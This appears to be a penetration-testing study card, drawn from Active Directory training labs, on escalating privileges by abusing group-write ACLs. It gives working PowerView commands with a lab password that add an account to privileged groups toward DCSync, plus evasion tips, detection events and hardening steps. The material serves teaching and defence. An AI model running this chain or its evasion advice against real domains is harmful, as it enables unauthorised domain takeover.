name: PowerView - Abuse GenericWrite/AddMember ACL
description: Adds a user to a group using GenericWrite, AddSelf, or AddMember rights on the group object. If your controlled account (damundsen) has GenericWrite over a group (Help Desk Level 1), you can add any account to that group — including accounts that then inherit further rights. Core step in multi-hop ACL escalation chains.
source: CPTS Module 13: Active Directory Enumeration & Attacks
notes:
=== RIGHTS THAT ENABLE GROUP MEMBERSHIP ABUSE ===
  GenericWrite    → write any non-protected attribute on the object
                    (includes group membership attribute 'member')
  AddSelf         → user can add themselves specifically to the group
  AddMember       → can add any account to the group
  GenericAll      → all of the above

=== WHY THIS IS POWERFUL IN CHAINS ===
Groups in AD often inherit rights from their parent or hold rights on other objects.
Example chain from Module 13:
  wley → ForceChangePassword → damundsen
  damundsen → GenericWrite → 'Help Desk Level 1' group  [this card]
  Help Desk Level 1 → AddSelf → 'IT Admins' group       [this card again]
  IT Admins → WriteDACL → Domain object
  → Grant yourself DCSync → secretsdump everything

Adding to groups is how you traverse these chains.

=== FULL PROCEDURE FOR THE LAB CHAIN ===
# 1. Set up damundsen credential (after ForceChangePassword)
$SecPassword2 = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword2)

# 2. Add damundsen to Help Desk Level 1 (GenericWrite on group)
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose

# 3. Verify membership
Get-DomainGroupMember -Identity 'Help Desk Level 1' | Select MemberName

# 4. Now Help Desk Level 1 member can add self to IT Admins (AddSelf)
# Create a fake user credential or use damundsen who is now in Help Desk Level 1
Add-DomainGroupMember -Identity 'IT Admins' -Members 'damundsen' -Credential $Cred2 -Verbose

=== DETECTION ===
Group membership changes generate Event 4728 (global group member added) or
4732 (local group member added). Monitored by Tier 0 incident response teams
but often missed for lower-privilege groups.

=== CLEANUP (IF NEEDED) ===
Remove-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 Also covered in: OSCP PEN-200 Chapter 21 (Active Directory Introduction and Enumeration).

defense.why_it_works: Abuses GenericWrite/AddMember (Add-DomainGroupMember) to add a controlled account to a privileged group, inheriting its rights.
defense.prerequisites: Write/AddMember rights over the target group.
defense.impact: Membership in a privileged group (e.g. a group with DA-equivalent rights) - escalation.
defense.detection: [MITRE T1098] Event 4728/4732/4756 (member added to a security group) where the actor isn't an admin; a change to a privileged group.
defense.prevention: Audit group-write ACLs; alert on privileged-group membership changes (4728/4732); remove self after use is still logged.
defense.evasion: Remove the membership after use to limit the window (the add is logged regardless); target a less-watched privileged group.
defense.misconfiguration: Non-privileged users or groups have been granted sensitive AD object permissions (WriteDACL, GenericAll, GenericWrite, ForceChangePassword, AddMember, etc.) through misconfigured delegation, 'inherited from parent' ACEs copied at provisioning time, or direct one-off grants. Because AD ACEs are not surfaced in the normal GUI, these often persist for years.
defense.vulnerable_config:
# Example: a help-desk group has ForceChangePassword on Domain Admins members
# Found via BloodHound 'ForceChangePassword' edge, or PowerView:
Get-ObjectAcl -Identity 'Domain Admins' -ResolveGUIDs |
  Where-Object {$_.ActiveDirectoryRights -match 'ResetPassword'} |
  Select-Object IdentityReference, ActiveDirectoryRights, ObjectType

# Another dangerous pattern — GenericWrite on a user (enables targeted Kerberoasting):
Get-ObjectAcl -Identity 'svc_sql' -ResolveGUIDs |
  Where-Object {$_.ActiveDirectoryRights -match 'GenericWrite'}
defense.secure_config:
# 1. Run AD ACL audit quarterly (automated):
# BloodHound: Mark all Domain Admins as 'High Value', find paths from low-priv users
# PowerView batch:
Get-DomainObjectAcl -ResolveGUIDs |
  Where-Object {$_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDACL|WriteOwner'} |
  Where-Object {$_.IdentityReference -notmatch 'Domain Admins|Enterprise Admins|SYSTEM'} |
  Export-Csv acl_review.csv

# 2. Remove dangerous ACEs:
Remove-DomainObjectAcl -TargetIdentity 'svc_sql' \
    -PrincipalIdentity 'helpdesk' -Rights GenericWrite

# 3. Enable AD Protected Users group for privileged accounts
# 4. Use tiered administration (Admin Tier 0/1/2) to limit blast radius
